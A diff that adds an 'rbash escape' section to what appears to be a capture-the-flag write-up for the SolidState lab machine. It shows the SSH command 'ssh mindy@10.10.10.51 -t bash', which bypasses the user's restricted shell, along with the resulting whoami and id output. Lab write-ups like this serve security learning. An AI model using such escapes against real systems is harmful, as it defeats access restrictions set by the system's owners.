@@ -377,3 +377,29 @@ b130c6e67c2ba7bce64e572d73xxxxxx
 ```
 
 <br />
+
+### rbash escape:
+
+<br />
+
+We can escape the restricted shell adding the `-t` flag to our `SSH` command:
+
+<br />
+
+```bash
+❯ ssh mindy@10.10.10.51 -t bash
+mindy@10.10.10.51's password: 
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
+mindy
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
+```
+
+<br />
+
+By this way, we're going to run a `bash` instead the `rbash` assigned to the user `mindy`.
+
+<br />
+
+
